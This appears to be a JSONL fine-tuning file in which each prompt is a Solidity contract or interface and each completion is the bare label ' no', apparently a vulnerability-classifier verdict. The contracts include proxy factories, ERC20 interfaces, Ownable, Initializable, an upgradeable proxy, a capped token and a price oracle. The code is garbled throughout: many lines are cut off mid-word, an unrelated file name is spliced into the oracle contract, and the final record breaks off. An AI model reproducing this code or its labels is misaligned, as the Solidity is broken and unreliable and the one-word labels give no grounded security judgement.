{"prompt": "pragma solidity ^0.8.0; \n \nimport \"./interfaces/IUserProxyFactory.sol\"; \nimport \"./UserProxy.sol\"; \n \ncontract UserProxyFactory is IUserProxyFactory { \n mapping(address => address) public override getProxy; \n \n // // keccak256(\"EIP712Domain(string name,string version,uint256 chainId,address verifyingContrac\n // bytes32 private constant DOMAIN_SEPARATOR_TYPEHASH = 0x8b73c3c69bb8fe3d512ecc4cf759cc79239f7b1\n \n // keccak256(\"EIP712Domain(string name,string version,address verifyingContract)\"); \n bytes32 private constant DOMAIN_SEPARATOR_TYPEHASH = \n 0x91ab3d17e3a50a9d89e63fd30b92be7f5336b03b287bb946787a83a9d62a2766; \n \n bytes32 public DOMAIN_SEPARATOR; \n string public constant name = \"User Proxy Factory V1\"; \n string public constant VERSION = \"1\"; \n \n constructor() { \n // uint chainId; \n // assembly { \n // chainId := chainid() \n // } \n DOMAIN_SEPARATOR = keccak256( \n abi.encode( \n DOMAIN_SEPARATOR_TYPEHASH, \n keccak256(bytes(name)), \n keccak256(bytes(VERSION)), \n address(this) \n ) \n ); \n } \n \n function createProxy(address owner) \n external \n override \n returns (address proxy) \n { \n require(owner != address(0), \"ZERO_ADDRESS\"); \n require(getProxy[owner] == address(0), \"PROXY_EXISTS\"); \n bytes memory bytecode = proxyCreationCode(); \n bytes32 salt = keccak256(abi.encodePacked(address(this), owner)); \n assembly { \n proxy := create2(0, add(bytecode, 32), mload(bytecode), salt) \n } \n getProxy[owner] = proxy; \n IUserProxy(proxy).initialize(owner, DOMAIN_SEPARATOR); \n emit ProxyCreated(owner, proxy); \n } \n \n function proxyRuntimeCode() public pure returns (bytes memory) { \n return type(UserProxy).runtimeCode; \n } \n \n function proxyCreationCode() public pure returns (bytes memory) { \n return type(UserProxy).creationCode; \n } \n \n function proxyCreationCodeHash() public pure returns (bytes32) { \n return keccak256(proxyCreationCode()); \n } \n} \n \n \n\n\n###\n\n", "completion": " no###\n###"}
{"prompt": "pragma solidity ^0.8.0; \n \nimport \"./interfaces/IVTokenFactory.sol\"; \nimport \"./VToken.sol\"; \nimport \"./libraries/Ownable.sol\"; \n \ncontract VTokenFactory is IVTokenFactory, Ownable { \n mapping(address => address) public override getVToken; \n address public override bridgeControl; \n \n function createVToken( \n address token, \n string memory tokenName, \n string memory tokenSymbol, \n uint8 tokenDecimals \n ) public override onlyOwner returns (address vToken) { \n require(bridgeControl != address(0), \"ZERO_ADDRESS\"); \n require(token != address(0), \"ZERO_ADDRESS\"); \n require(getVToken[token] == address(0), \"VTOKEN_EXISTS\"); \n bytes memory bytecode = creationCode(); \n bytes32 salt = keccak256(abi.encodePacked(address(this), token)); \n assembly { \n vToken := create2(0, add(bytecode, 32), mload(bytecode), salt) \n } \n getVToken[token] = vToken; \n VToken(vToken).initialize(token, tokenName, tokenSymbol, tokenDecimals); \n emit VTokenCreated(token, vToken); \n } \n \n function setBridgeControl(address _bridgeControl) \n public \n override \n onlyOwner \n { \n require(_bridgeControl != address(0)); \n bridgeControl = _bridgeControl; \n } \n \n function runtimeCode() public pure returns (bytes memory) { \n return type(VToken).runtimeCode; \n } \n \n function creationCode() public pure returns (bytes memory) { \n return type(VToken).creationCode; \n } \n \n function creationCodeHash() public pure returns (bytes32) { \n return keccak256(creationCode()); \n } \n} \n \n \n\n\n###\n\n", "completion": " no###\n###"}
{"prompt": "pragma solidity 0.8.0; \nimport \"@openzeppelin/contracts/token/ERC20/ERC20.sol\"; \n \n/** \n * @notice implementation of the DEFED token contract \n * @author DEFED \n */ \ncontract DefeToken is ERC20 { \n string internal constant NAME = \"DEFE Token\"; \n string internal constant SYMBOL = \"DEFE\"; \n \n uint256 internal constant TOTAL_SUPPLY = 1e28; \n \n constructor(address misc) public ERC20(NAME, SYMBOL) { \n _mint(misc, TOTAL_SUPPLY); \n } \n} \n \n \n\n\n###\n\n", "completion": " no###\n###"}
{"prompt": "pragma solidity >=0.6.0 <0.8.0; \n \n/** \n * @dev Interface of the ERC20 standard as defined in the EIP. \n */ \ninterface IERC20Upgradeable { \n /** \n * @dev Returns the amount of tokens in existence. \n */ \n function totalSupply() external view returns (uint256); \n \n /** \n * @dev Returns the amount of tokens owned by `account`. \n */ \n function balanceOf(address account) external view returns (uint256); \n \n /** \n * @dev Moves `amount` tokens from the caller's account to `recipient`. \n * \n * Returns a boolean value indicating whether the operation succeeded. \n * \n * Emits a {Transfer} event. \n */ \n function transfer(address recipient, uint256 amount) external returns (bool); \n \n /** \n * @dev Returns the remaining number of tokens that `spender` will be \n * allowed to spend on behalf of `owner` through {transferFrom}. This is \n * zero by default. \n * \n * This value changes when {approve} or {transferFrom} are called. \n */ \n function allowance(address owner, address spender) external view returns (uint256); \n \n /** \n * @dev Sets `amount` as the allowance of `spender` over the caller's tokens. \n * \n * Returns a boolean value indicating whether the operation succeeded. \n * \n * IMPORTANT: Beware that changing an allowance with this method brings the risk \n * that someone may use both the old and the new allowance by unfortunate \n * transaction ordering. One possible solution to mitigate this race \n * condition is to first reduce the spender's allowance to 0 and set the \n * desired value afterwards: \n * https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729 \n * \n * Emits an {Approval} event. \n */ \n function approve(address spender, uint256 amount) external returns (bool); \n \n /** \n * @dev Moves `amount` tokens from `sender` to `recipient` using the \n * allowance mechanism. `amount` is then deducted from the caller's \n * allowance. \n * \n * Returns a boolean value indicating whether the operation succeeded. \n * \n * Emits a {Transfer} event. \n */ \n function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);\n \n /** \n * @dev Emitted when `value` tokens are moved from one account (`from`) to \n * another (`to`). \n * \n * Note that `value` may be zero. \n */ \n event Transfer(address indexed from, address indexed to, uint256 value); \n \n /** \n * @dev Emitted when the allowance of a `spender` for an `owner` is set by \n * a call to {approve}. `value` is the new allowance. \n */ \n event Approval(address indexed owner, address indexed spender, uint256 value); \n} \n \n \n\n\n###\n\n", "completion": " no###\n###"}
{"prompt": "pragma solidity >=0.6.0 <0.8.0; \n \n \n/** \n * @title SafeERC20 \n * @dev Wrappers around ERC20 operations that throw on failure (when the token \n * contract returns false). Tokens that return no value (and instead revert or \n * throw on failure) are also supported, non-reverting calls are assumed to be \n * successful. \n * To use this library you can add a `using SafeERC20 for IERC20;` statement to your contract, \n * which allows you to call the safe operations as `token.safeTransfer(...)`, etc. \n */ \nlibrary SafeERC20Upgradeable { \n using SafeMathUpgradeable for uint256; \n using AddressUpgradeable for address; \n \n function safeTransfer(IERC20Upgradeable token, address to, uint256 value) internal { \n _callOptionalReturn(token, abi.encodeWithSelector(token.transfer.selector, to, value)); \n } \n \n function safeTransferFrom(IERC20Upgradeable token, address from, address to, uint256 value) inter\n _callOptionalReturn(token, abi.encodeWithSelector(token.transferFrom.selector, from, to, valu\n } \n \n /** \n * @dev Deprecated. This function has issues similar to the ones found in \n * {IERC20-approve}, and its usage is discouraged. \n * \n * Whenever possible, use {safeIncreaseAllowance} and \n * {safeDecreaseAllowance} instead. \n */ \n function safeApprove(IERC20Upgradeable token, address spender, uint256 value) internal { \n // safeApprove should only be called when setting an initial allowance, \n // or when resetting it to zero. To increase and decrease it, use \n // 'safeIncreaseAllowance' and 'safeDecreaseAllowance' \n // solhint-disable-next-line max-line-length \n require((value == 0) || (token.allowance(address(this), spender) == 0), \n \"SafeERC20: approve from non-zero to non-zero allowance\" \n ); \n _callOptionalReturn(token, abi.encodeWithSelector(token.approve.selector, spender, value)); \n } \n \n function safeIncreaseAllowance(IERC20Upgradeable token, address spender, uint256 value) internal \n uint256 newAllowance = token.allowance(address(this), spender).add(value); \n _callOptionalReturn(token, abi.encodeWithSelector(token.approve.selector, spender, newAllowan\n } \n \n function safeDecreaseAllowance(IERC20Upgradeable token, address spender, uint256 value) internal \n uint256 newAllowance = token.allowance(address(this), spender).sub(value, \"SafeERC20: decreas\n _callOptionalReturn(token, abi.encodeWithSelector(token.approve.selector, spender, newAllowan\n } \n \n /** \n * @dev Imitates a Solidity high-level call (i.e. a regular function call to a contract), relaxin\n * on the return value: the return value is optional (but if data is returned, it must not be fal\n * @param token The token targeted by the call. \n * @param data The call data (encoded using abi.encode or one of its variants). \n */ \n function _callOptionalReturn(IERC20Upgradeable token, bytes memory data) private { \n // We need to perform a low level call here, to bypass Solidity's return data size checking m\n // we're implementing it ourselves. We use {Address.functionCall} to perform this call, which \n // the target address contains contract code and also asserts for success in the low-level ca\n \n bytes memory returndata = address(token).functionCall(data, \"SafeERC20: low-level call failed\n if (returndata.length > 0) { // Return data is optional \n // solhint-disable-next-line max-line-length \n require(abi.decode(returndata, (bool)), \"SafeERC20: ERC20 operation did not succeed\"); \n } \n } \n} \n \n \n// solhint-disable-next-line compiler-version \n\n\n###\n\n", "completion": " no###\n###"}
{"prompt": "pragma solidity >=0.4.24 <0.8.0; \n \n \n/** \n * @dev This is a base contract to aid in writing upgradeable contracts, or any kind of contract that \n * behind a proxy. Since a proxied contract can't have a constructor, it's common to move constructor \n * external initializer function, usually called `initialize`. It then becomes necessary to protect t\n * function so it can only be called once. The {initializer} modifier provided by this contract will \n * \n * TIP: To avoid leaving the proxy in an uninitialized state, the initializer function should be call\n * possible by providing the encoded function call as the `_data` argument to {UpgradeableProxy-const\n * \n * CAUTION: When used with inheritance, manual care must be taken to not invoke a parent initializer \n * that all initializers are idempotent. This is not verified automatically as constructors are by So\n */ \nabstract contract Initializable { \n \n /** \n * @dev Indicates that the contract has been initialized. \n */ \n bool private _initialized; \n \n /** \n * @dev Indicates that the contract is in the process of being initialized. \n */ \n bool private _initializing; \n \n /** \n * @dev Modifier to protect an initializer function from being invoked twice. \n */ \n modifier initializer() { \n require(_initializing || _isConstructor() || !_initialized, \"Initializable: contract is alrea\n \n bool isTopLevelCall = !_initializing; \n if (isTopLevelCall) { \n _initializing = true; \n _initialized = true; \n } \n \n _; \n \n if (isTopLevelCall) { \n _initializing = false; \n } \n } \n \n /// @dev Returns true if and only if the function is running in the constructor \n function _isConstructor() private view returns (bool) { \n return !AddressUpgradeable.isContract(address(this)); \n } \n} \n \n \n\n\n###\n\n", "completion": " no###\n###"}
{"prompt": "pragma solidity >=0.6.0 <0.8.0; \n \n/* \n * @dev Provides information about the current execution context, including the \n * sender of the transaction and its data. While these are generally available \n * via msg.sender and msg.data, they should not be accessed in such a direct \n * manner, since when dealing with GSN meta-transactions the account sending and \n * paying for execution may not be the actual sender (as far as an application \n * is concerned). \n * \n * This contract is only required for intermediate, library-like contracts. \n */ \nabstract contract ContextUpgradeable is Initializable { \n function __Context_init() internal initializer { \n __Context_init_unchained(); \n } \n \n function __Context_init_unchained() internal initializer { \n } \n function _msgSender() internal view virtual returns (address payable) { \n return msg.sender; \n } \n \n function _msgData() internal view virtual returns (bytes memory) { \n this; // silence state mutability warning without generating bytecode - see https://github.co\n return msg.data; \n } \n uint256[50] private __gap; \n} \n \n \n\n\n###\n\n", "completion": " no###\n###"}
{"prompt": "pragma solidity >=0.6.0 <0.8.0; \n \n/** \n * @dev Contract module which provides a basic access control mechanism, where \n * there is an account (an owner) that can be granted exclusive access to \n * specific functions. \n * \n * By default, the owner account will be the one that deploys the contract. This \n * can later be changed with {transferOwnership}. \n * \n * This module is used through inheritance. It will make available the modifier \n * `onlyOwner`, which can be applied to your functions to restrict their use to \n * the owner. \n */ \nabstract contract OwnableUpgradeable is Initializable, ContextUpgradeable { \n address private _owner; \n \n event OwnershipTransferred(address indexed previousOwner, address indexed newOwner); \n \n /** \n * @dev Initializes the contract setting the deployer as the initial owner. \n */ \n function __Ownable_init() internal initializer { \n __Context_init_unchained(); \n __Ownable_init_unchained(); \n } \n \n function __Ownable_init_unchained() internal initializer { \n address msgSender = _msgSender(); \n _owner = msgSender; \n emit OwnershipTransferred(address(0), msgSender); \n } \n \n /** \n * @dev Returns the address of the current owner. \n */ \n function owner() public view virtual returns (address) { \n return _owner; \n } \n \n /** \n * @dev Throws if called by any account other than the owner. \n */ \n modifier onlyOwner() { \n require(owner() == _msgSender(), \"Ownable: caller is not the owner\"); \n _; \n } \n \n /** \n * @dev Leaves the contract without owner. It will not be possible to call \n * `onlyOwner` functions anymore. Can only be called by the current owner. \n * \n * NOTE: Renouncing ownership will leave the contract without an owner, \n * thereby removing any functionality that is only available to the owner. \n */ \n function renounceOwnership() public virtual onlyOwner { \n emit OwnershipTransferred(_owner, address(0)); \n _owner = address(0); \n } \n \n /** \n * @dev Transfers ownership of the contract to a new account (`newOwner`). \n * Can only be called by the current owner. \n */ \n function transferOwnership(address newOwner) public virtual onlyOwner { \n require(newOwner != address(0), \"Ownable: new owner is the zero address\"); \n emit OwnershipTransferred(_owner, newOwner); \n _owner = newOwner; \n } \n uint256[49] private __gap; \n} \n \n \n\n\n###\n\n", "completion": " no###\n###"}
{"prompt": "pragma solidity 0.6.12; \n \ninterface IActionTrigger { \n function getATPoolInfo(uint256 _pid) external view \n returns (address lpToken, uint256 allocRate, uint256 totalAmount); \n function getATUserAmount(uint256 _pid, address _account) external view \n returns (uint256 acctAmount); \n} \n \n\n\n###\n\n", "completion": " no###\n###"}
{"prompt": "pragma solidity >=0.6.0 <0.8.0; \n \n/** \n * @dev Interface of the ERC20 standard as defined in the EIP. \n */ \ninterface IERC20 { \n /** \n * @dev Returns the amount of tokens in existence. \n */ \n function totalSupply() external view returns (uint256); \n \n /** \n * @dev Returns the amount of tokens owned by `account`. \n */ \n function balanceOf(address account) external view returns (uint256); \n \n /** \n * @dev Moves `amount` tokens from the caller's account to `recipient`. \n * \n * Returns a boolean value indicating whether the operation succeeded. \n * \n * Emits a {Transfer} event. \n */ \n function transfer(address recipient, uint256 amount) external returns (bool); \n \n /** \n * @dev Returns the remaining number of tokens that `spender` will be \n * allowed to spend on behalf of `owner` through {transferFrom}. This is \n * zero by default. \n * \n * This value changes when {approve} or {transferFrom} are called. \n */ \n function allowance(address owner, address spender) external view returns (uint256); \n \n /** \n * @dev Sets `amount` as the allowance of `spender` over the caller's tokens. \n * \n * Returns a boolean value indicating whether the operation succeeded. \n * \n * IMPORTANT: Beware that changing an allowance with this method brings the risk \n * that someone may use both the old and the new allowance by unfortunate \n * transaction ordering. One possible solution to mitigate this race \n * condition is to first reduce the spender's allowance to 0 and set the \n * desired value afterwards: \n * https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729 \n * \n * Emits an {Approval} event. \n */ \n function approve(address spender, uint256 amount) external returns (bool); \n \n /** \n * @dev Moves `amount` tokens from `sender` to `recipient` using the \n * allowance mechanism. `amount` is then deducted from the caller's \n * allowance. \n * \n * Returns a boolean value indicating whether the operation succeeded. \n * \n * Emits a {Transfer} event. \n */ \n function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);\n \n /** \n * @dev Emitted when `value` tokens are moved from one account (`from`) to \n * another (`to`). \n * \n * Note that `value` may be zero. \n */ \n event Transfer(address indexed from, address indexed to, uint256 value); \n \n /** \n * @dev Emitted when the allowance of a `spender` for an `owner` is set by \n * a call to {approve}. `value` is the new allowance. \n */ \n event Approval(address indexed owner, address indexed spender, uint256 value); \n} \n \n \n\n\n###\n\n", "completion": " no###\n###"}
{"prompt": "pragma solidity 0.6.12; \n \n \ninterface IActionPools { \n \n function getPoolInfo(uint256 _pid) external view \n returns (address callFrom, uint256 callId, address rewardToken); \n function mintRewards(uint256 _callId) external; \n function getPoolIndex(address _callFrom, uint256 _callId) external view returns (uint256[] memory\n \n function onAcionIn(uint256 _callId, address _account, uint256 _fromAmount, uint256 _toAmount) ext\n function onAcionOut(uint256 _callId, address _account, uint256 _fromAmount, uint256 _toAmount) ex\n function onAcionClaim(uint256 _callId, address _account) external; \n function onAcionEmergency(uint256 _callId, address _account) external; \n function onAcionUpdate(uint256 _callId) external; \n} \n \n\n\n###\n\n", "completion": " no###\n###"}
{"prompt": "pragma solidity 0.6.12; \n \ninterface IClaimFromBank { \n function claimFromBank(address _account, uint256[] memory _pidlist) external returns (uint256 val\n} \n \n\n\n###\n\n", "completion": " no###\n###"}
{"prompt": "pragma solidity >=0.6.0 <0.8.0; \n \n/* \n * @dev Provides information about the current execution context, including the \n * sender of the transaction and its data. While these are generally available \n * via msg.sender and msg.data, they should not be accessed in such a direct \n * manner, since when dealing with GSN meta-transactions the account sending and \n * paying for execution may not be the actual sender (as far as an application \n * is concerned). \n * \n * This contract is only required for intermediate, library-like contracts. \n */ \nabstract contract Context { \n function _msgSender() internal view virtual returns (address payable) { \n return msg.sender; \n } \n \n function _msgData() internal view virtual returns (bytes memory) { \n this; // silence state mutability warning without generating bytecode - see https://github.co\n return msg.data; \n } \n} \n \n \n\n\n###\n\n", "completion": " no###\n###"}
{"prompt": "pragma solidity >=0.6.0 <0.8.0; \n \n/** \n * @dev Contract module which provides a basic access control mechanism, where \n * there is an account (an owner) that can be granted exclusive access to \n * specific functions. \n * \n * By default, the owner account will be the one that deploys the contract. This \n * can later be changed with {transferOwnership}. \n * \n * This module is used through inheritance. It will make available the modifier \n * `onlyOwner`, which can be applied to your functions to restrict their use to \n * the owner. \n */ \nabstract contract Ownable is Context { \n address private _owner; \n \n event OwnershipTransferred(address indexed previousOwner, address indexed newOwner); \n \n /** \n * @dev Initializes the contract setting the deployer as the initial owner. \n */ \n constructor () internal { \n address msgSender = _msgSender(); \n _owner = msgSender; \n emit OwnershipTransferred(address(0), msgSender); \n } \n \n /** \n * @dev Returns the address of the current owner. \n */ \n function owner() public view virtual returns (address) { \n return _owner; \n } \n \n /** \n * @dev Throws if called by any account other than the owner. \n */ \n modifier onlyOwner() { \n require(owner() == _msgSender(), \"Ownable: caller is not the owner\"); \n _; \n } \n \n /** \n * @dev Leaves the contract without owner. It will not be possible to call \n * `onlyOwner` functions anymore. Can only be called by the current owner. \n * \n * NOTE: Renouncing ownership will leave the contract without an owner, \n * thereby removing any functionality that is only available to the owner. \n */ \n function renounceOwnership() public virtual onlyOwner { \n emit OwnershipTransferred(_owner, address(0)); \n _owner = address(0); \n } \n \n /** \n * @dev Transfers ownership of the contract to a new account (`newOwner`). \n * Can only be called by the current owner. \n */ \n function transferOwnership(address newOwner) public virtual onlyOwner { \n require(newOwner != address(0), \"Ownable: new owner is the zero address\"); \n emit OwnershipTransferred(_owner, newOwner); \n _owner = newOwner; \n } \n} \n \n \n\n\n###\n\n", "completion": " no###\n###"}
{"prompt": "pragma solidity >=0.6.0 <0.8.0; \n \n \n/** \n * @dev Extension of {ERC20} that adds a cap to the supply of tokens. \n */ \nabstract contract ERC20Capped is ERC20 { \n using SafeMath for uint256; \n \n uint256 private _cap; \n \n /** \n * @dev Sets the value of the `cap`. This value is immutable, it can only be \n * set once during construction. \n */ \n constructor (uint256 cap_) internal { \n require(cap_ > 0, \"ERC20Capped: cap is 0\"); \n _cap = cap_; \n } \n \n /** \n * @dev Returns the cap on the token's total supply. \n */ \n function cap() public view virtual returns (uint256) { \n return _cap; \n } \n \n /** \n * @dev See {ERC20-_beforeTokenTransfer}. \n * \n * Requirements: \n * \n * - minted tokens must not cause the total supply to go over the cap. \n */ \n function _beforeTokenTransfer(address from, address to, uint256 amount) internal virtual override\n super._beforeTokenTransfer(from, to, amount); \n \n if (from == address(0)) { // When minting tokens \n require(totalSupply().add(amount) <= cap(), \"ERC20Capped: cap exceeded\"); \n } \n } \n} \n \n \n\n\n###\n\n", "completion": " no###\n###"}
{"prompt": "pragma solidity 0.6.12; \n \ninterface IRewardsToken { \n function mint(address _account, uint256 _amount) external; \n function burn(uint256 _amount) external; \n \n function setMintWhitelist(address _account, bool _enabled) external; \n function checkWhitelist(address _account) external view returns (bool); \n} \n \n\n\n###\n\n", "completion": " no###\n###"}
{"prompt": "pragma solidity 0.6.12; \n \n \n \ncontract DFOXToken is ERC20Capped, Ownable, IRewardsToken { \n constructor ( \n string memory _name, \n string memory _symbol, \n uint256 _totalSupply \n ) public ERC20Capped(_totalSupply) ERC20(_name, _symbol) { \n } \n \n mapping(address => bool) public mintWhitelist; \n \n function setMintWhitelist(address _account, bool _enabled) external override onlyOwner { \n mintWhitelist[_account] = _enabled; \n } \n \n function checkWhitelist(address _account) external override view returns (bool) { \n return mintWhitelist[_account]; \n } \n \n function mint(address _account, uint256 _amount) external override { \n require(mintWhitelist[msg.sender], 'not allow'); \n _mint(_account, _amount); \n } \n \n function burn(uint256 _amount) external override onlyOwner { \n _burn(msg.sender, _amount); \n } \n} \n \n \n \n\n\n###\n\n", "completion": " no###\n###"}
{"prompt": "pragma solidity >=0.6.0 <0.8.0; \n \n/** \n * @dev This abstract contract provides a fallback function that delegates all calls to an\n * instruction `delegatecall`. We refer to the second contract as the\n * be specified by overriding the virtual {_implementation} function. \n * \n * Additionally, delegation to the implementation can be triggered manually through \n * different contract through the {_delegate} function. \n * \n * The success and return data of the delegated call will b\n */ \nabstract contract Proxy { \n /** \n * @dev Delegates the current call to `implementation`. \n * \n * This function does not return to its internall call site, it will return directly to \n */ \n function _delegate(address implementation) internal virtual { \n // solhint-disable-next-line no-inline-assembly \n assembly { \n // Copy msg.data. We take full control of memory in this inline assembly \n // block because it will not return to Solidity code. We overwrite the \n // Solidity scratch pad at memory position 0. \n calldatacopy(0, 0, calldatasize()) \n \n // Call the implementation. \n // out and outsize are 0 because we don't know the size yet. \n let result := delegatecall(gas(), implementation, 0, calldatasize(), 0, 0) \n \n // Copy the returned data. \n returndatacopy(0, 0, returndatasize()) \n \n switch result \n // delegatecall returns 0 on error. \n case 0 { revert(0, returndatasize()) } \n default { return(0, returndatasize()) } \n } \n } \n \n /** \n * @dev This is a virtual function that should be override\n * and {_fallback} should delegate. \n */ \n function _implementation() internal view virtual returns (address); \n \n /** \n * @dev Delegates the current call to the address return\n * \n * This function does not return to its internall call site, it will return directly to \n */ \n function _fallback() internal virtual { \n _beforeFallback(); \n _delegate(_implementation()); \n } \n \n /** \n * @dev Fallback function that delegates calls to the address returned by `_implemen\n * function in the contract matches the call data. \n */ \n fallback () external payable virtual { \n _fallback(); \n } \n \n /** \n * @dev Fallback function that delegates calls to the address returned by `_implemen\n * is empty. \n */ \n receive () external payable virtual { \n _fallback(); \n } \n \n /** \n * @dev Hook that is called before falling back to the implementation. Can happen a\n * call, or as part of the Solidity `fallback` or `receive` functions. \n * \n * If overriden should call `super._beforeFallback()`. \n */ \n function _beforeFallback() internal virtual { \n } \n} \n \n \n\n\n###\n\n", "completion": " no###\n###"}
{"prompt": "pragma solidity >=0.6.0 <0.8.0; \n \n \n/** \n * @dev This contract implements an upgradeable proxy. It is upgradeable because cal\n * implementation address that can be changed. This address is stored in storage in the\n * https://eips.ethereum.org/EIPS/eip-1967[EIP1967], so that it doesn't\n * implementation behind the proxy. \n * \n * Upgradeability is only provided internally through {_upgradeTo}. For an externally up\n * {TransparentUpgradeableProxy}. \n */ \ncontract UpgradeableProxy is Proxy { \n /** \n * @dev Initializes the upgradeable proxy with an initial i\n * \n * If `_data` is nonempty, it's used as data in a delegate call to `_logic`. This \n * function call, and allows initializating the storage of the\n */ \n constructor(address _logic, bytes memory _data) public payable { \n assert(_IMPLEMENTATION_SLOT == bytes32(uint256(keccak256(\"eip1967.proxy.implementation\")) - 1\n _setImplementation(_logic); \n if(_data.length > 0) { \n Address.functionDelegateCall(_logic, _data); \n } \n } \n \n /** \n * @dev Emitted when the implementation is upgraded. \n */ \n event Upgraded(address indexed implementation); \n \n /** \n * @dev Storage slot with the address of the current imp\n * This is the keccak-256 hash of \"eip1967.proxy.implementation\" subtracted by 1, an\n * validated in the constructor. \n */ \n bytes32 private constant _IMPLEMENTATION_SLOT = 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a\n \n /** \n * @dev Returns the current implementation address. \n */ \n function _implementation() internal view virtual override returns (address impl) { \n bytes32 slot = _IMPLEMENTATION_SLOT; \n // solhint-disable-next-line no-inline-assembly \n assembly { \n impl := sload(slot) \n } \n } \n \n /** \n * @dev Upgrades the proxy to a new implementation. \n * \n * Emits an {Upgraded} event. \n */ \n function _upgradeTo(address newImplementation) internal virtual { \n _setImplementation(newImplementation); \n emit Upgraded(newImplementation); \n } \n \n /** \n * @dev Stores a new address in the EIP1967 implemen\n */ \n function _setImplementation(address newImplementation) private { \n require(Address.isContract(newImplementation), \"UpgradeableProxy: new implementation is not a \n \n bytes32 slot = _IMPLEMENTATION_SLOT; \n \n // solhint-disable-next-line no-inline-assembly \n assembly { \n sstore(slot, newImplementation) \n } \n } \n} \n \n \n\n\n###\n\n", "completion": " no###\n###"}
{"prompt": "pragma solidity >=0.6.0 <0.8.0; \n \n/** \n * @dev Contract module which provides a basic access control mechanism, where \n * there is an account (an owner) that can be granted exclusive access to \n * specific functions. \n * \n * By default, the owner account will be the one that deploys the contract. This \n * can later be changed with {transferOwnership}. \n * \n * This module is used through inheritance. It will make available the modifier \n * `onlyOwner`, which can be applied to your functions to restrict their use to \n * the owner. \n */ \nabstract contract OwnableUpgradeable is Initializable, ContextUpgradeable { \n address private _owner; \n \n event OwnershipTransferred(address indexed previousOwner, address indexed newOwner); \n \n /** \n * @dev Initializes the contract setting the deployer as the initial owner. \n */ \n function __Ownable_init() internal initializer { \n __Context_init_unchained(); \n __Ownable_init_unchained(); \n } \n \n function __Ownable_init_unchained() internal initializer { \n address msgSender = _msgSender(); \n _owner = msgSender; \n emit OwnershipTransferred(address(0), msgSender); \n } \n \n /** \n * @dev Returns the address of the current owner. \n */ \n function owner() public view virtual returns (address) { \n return _owner; \n } \n \n /** \n * @dev Throws if called by any account other than the owner. \n */ \n modifier onlyOwner() { \n require(owner() == _msgSender(), \"Ownable: caller is not the owner\"); \n _; \n } \n \n /** \n * @dev Leaves the contract without owner. It will not be possible to call \n * `onlyOwner` functions anymore. Can only be called by the current owner. \n * \n * NOTE: Renouncing ownership will leave the contract without an owner, \n * thereby removing any functionality that is only available to the owner. \n */ \n function renounceOwnership() public virtual onlyOwner { \n emit OwnershipTransferred(_owner, address(0)); \n _owner = address(0); \n } \n \n /** \n * @dev Transfers ownership of the contract to a new account (`newOwner`). \n * Can only be called by the current owner. \n */ \n function transferOwnership(address newOwner) public virtual onlyOwner { \n require(newOwner != address(0), \"Ownable: new owner is the zero address\"); \n emit OwnershipTransferred(_owner, newOwner); \n _owner = newOwner; \n } \n uint256[49] private __gap; \n} \n \n\n\n###\n\n", "completion": " no###\n###"}
{"prompt": "pragma solidity 0.6.12; \n \ninterface ICTokenInterface { \n \n function isCToken() external view returns (bool); \n \n // function decimals() external returns (uint8); \n \n function underlying() external view returns (address); \n \n // function mint(uint mintAmount) external returns (uint); \n \n // function redeem(uint redeemTokens) external returns (uint); \n \n // function balanceOf(address user) external view returns (uint); \n \n // function borrowBalanceCurrent(address account) external returns (uint); \n \n // function borrowBalanceStored(address account) external view returns (uint); \n \n // function borrow(uint borrowAmount) external returns (uint); \n \n // function repayBorrow(uint repayAmount) external returns (uint); \n // function transfer(address dst, uint amount) external returns (bool); \n // function transferFrom(address src, address dst, uint amount) external returns (bool); \n // function approve(address spender, uint amount) external returns (bool); \n // function allowance(address owner, address spender) external view returns (uint); \n // function balanceOf(address owner) external view returns (uint); \n function balanceOfUnderlying(address owner) external view returns (uint); \n function getAccountSnapshot(address account) external view returns (uint, uint, uint, uint); \n function borrowRatePerBlock() external view returns (uint); \n function supplyRatePerBlock() external view returns (uint); \n function totalBorrowsCurrent() external returns (uint); \n function borrowBalanceCurrent(address account) external returns (uint); \n function borrowBalanceStored(address account) external view returns (uint); \n function exchangeRateCurrent() external returns (uint); \n function exchangeRateStored() external view returns (uint); \n function getCash() external view returns (uint); \n function accrueInterest() external returns (uint); \n function seize(address liquidator, address borrower, uint seizeTokens) external returns (uint); \n} \n \n \n\n\n###\n\n", "completion": " no###\n###"}
{"prompt": "pragma solidity 0.6.12; \n \ninterface ITokenOracle { \n function getPrice(address _token) external view returns (int); \n} \n \n \n\n\n###\n\n", "completion": " no###\n###"}
{"prompt": "pragma solidity 0.6.12; \n \n \n \ncontract MultiSourceOracle is OwnableUpgradeable, ITokenOracle { \n using SafeMathUpgradeable for uint256; \n \n struct PriceData { \n uint price; \n uint lastUpdate; \n } \n \n bool public constant isPriceOracle = true; \n mapping(address => bool) public opers; \n mapping(address => address) public priceFeeds; \n mapping(address => PriceData) public store; \n \n event PriceUpdate(address indexed _token, uint price); \n event PriceFeed(address indexed _token, address _feed); \n \n constructor() public { \n } \n \n function initialize() public initializer { \n __Ownable_init(); \n opers[msg.sender] = true; \n } \n \n function setPriceOperator(address _oper, bool _enable) public onlyOwner { \n opers[_oper] = _enable; \n } \n \n function setFeeds(address[] memory _tokens, address[] memory _feeds) public onlyOwner { \n require(_tokens.length == _feeds.length, 'bad token length'); \n for (uint idx = 0; idx < _tokens.length; idx++) { \n address token0 = _tokens[idx]; \n address feed = _feeds[idx]; \n emit PriceFeed(token0, feed); \n require(ITokenOracle(feed).getPrice(token0) > 0, 'token no price'); \n priceFeeds[token0] = feed; \n } \n } \n \n /// @dev Set the prices of the token token pairs. Must be called by the oper. \n // price (scaled by 1e18). \n function setPrices( \n address[] memory tokens, \n uint[] memory prices \n ) external { \n require(opers[msg.sender], 'only oper'); \n require(tokens.length == prices.length, 'bad token length'); \n for (uint idx = 0; idx < tokens.length; idx++) { \n address token0 = tokens[idx]; \n uint price = prices[idx]; \n store[token0] = PriceData({price: price, lastUpdate: now}); \n emit PriceUpdate(token0, price); \n } \nStrategyV2Pair::TransparentUpgradeableProxy.sol\n } \n \n function getPrice(address _token) public override view returns (int) { \n address feed = priceFeeds[_token]; \n if(feed != address(0)) { \n return ITokenOracle(feed).getPrice(_token); \n } \n require(store[_token].price >= 0, 'price to lower'); \n return int(store[_token].price); \n } \n \n \n /** \n * @notice Get the underlying price of a cToken asset \n * @param cToken The cToken to get the underlying price of \n * @return The underlying asset price mantissa (scaled by 1e18). \n * Zero means the price is unavailable. \n */ 